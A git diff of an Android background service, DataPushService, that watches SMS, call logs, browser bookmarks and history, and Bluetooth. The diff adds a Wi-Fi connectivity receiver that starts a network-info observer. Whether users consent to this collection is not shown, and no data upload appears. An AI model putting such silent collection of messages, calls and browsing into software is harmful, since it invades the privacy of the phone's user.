@@ -3,13 +3,17 @@ package the5concurrentnodes.controllers;
 import android.app.AlarmManager;
 import android.app.PendingIntent;
 import android.app.Service;
+import android.content.BroadcastReceiver;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
+import android.net.ConnectivityManager;
 import android.net.Uri;
 import android.os.IBinder;
 import android.provider.Browser;
 import android.util.Log;
+import android.widget.Toast;
 
 import java.util.Date;
 
@@ -21,6 +25,7 @@ import the5concurrentnodes.mmaData.Browser.BrowserConstants;
 import the5concurrentnodes.mmaData.Browser.BrowserObserver;
 import the5concurrentnodes.mmaData.call.CallConstants;
 import the5concurrentnodes.mmaData.call.CallObserver;
+import the5concurrentnodes.mmaData.networkInfo.NetworkInfoObserver;
 import the5concurrentnodes.mmaData.sms.SmsConstants;
 import the5concurrentnodes.mmaData.sms.SmsObserver;
 
@@ -32,6 +37,7 @@ public class DataPushService extends Service{
     private CallObserver callObserver;
     private BrowserObserver browserObserver;
     private BluetoothObserver bluetoothObserver;
+    private NetworkInfoObserver networkInfoObserver;
 
     @Override
     public IBinder onBind(Intent intent) { return  null;}
@@ -40,6 +46,9 @@ public class DataPushService extends Service{
         public int onStartCommand(Intent intent, int flags, int startId) {
 
             if(!serviceInitialized) {
+
+                getApplication().registerReceiver(this.myWifiReceiver,
+                        new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION));
 
                 smsObserver = new SmsObserver(getApplicationContext());
                 callObserver = new CallObserver(getApplicationContext());
@@ -52,9 +61,6 @@ public class DataPushService extends Service{
                 //contentResolver.registerContentObserver(Uri.parse(BrowserConstants.CONTENT_DEFAULT_URI),true,browserObserver);
                // browserHistoryObserver = new BrowserHistoryObserver(new Handler());
                 getContentResolver().registerContentObserver(Browser.BOOKMARKS_URI, true, browserObserver);
-
-
-
                // contentResolver.registerContentObserver(Uri.parse(BrowserConstants.OPERA_CONTENT_URI),true,browserObserver);
                 contentResolver.registerContentObserver(Uri.parse(BrowserConstants.SAMSUNG_CONTENT_URI),true,browserObserver);
                 contentResolver.registerContentObserver(Uri.parse(BluetoothConstants.CONTENT_BLUETOOTH_URI),true, bluetoothObserver);
@@ -64,6 +70,18 @@ public class DataPushService extends Service{
 
             return  START_STICKY;
         }
+
+    private BroadcastReceiver myWifiReceiver = new BroadcastReceiver(){
+
+        @Override
+        public void onReceive(Context arg0, Intent arg1) {
+            // TODO Auto-generated method stub
+            android.net.NetworkInfo networkInfo = (android.net.NetworkInfo) arg1.getParcelableExtra(ConnectivityManager.EXTRA_NETWORK_INFO);
+            if(networkInfo.getType() == ConnectivityManager.TYPE_WIFI){
+                networkInfoObserver = new NetworkInfoObserver(getApplicationContext());
+            }
+        }
+    };
 
         @Override
         public void onDestroy() {
